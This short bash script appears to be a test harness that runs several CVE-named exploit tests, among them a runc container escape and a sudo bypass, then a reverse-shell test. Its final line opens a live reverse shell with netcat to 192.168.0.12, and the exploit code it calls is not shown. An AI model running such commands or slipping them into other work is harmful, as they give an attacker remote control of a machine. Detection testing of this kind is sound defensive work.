#!/usr/bin/env bash

sleep 15

python3 test/CVE-2019-3874/server.py
/usr/lib/go-1.10/bin/go run test/CVE-2019-5736/main.go
python3 test/CVE-2020-14386/server.py
./test/RS-SOCKET_AND_DUP2/script.sh
./test/CVE-2019-14287/script.sh
nc -e /bin/bash 192.168.0.12 1234
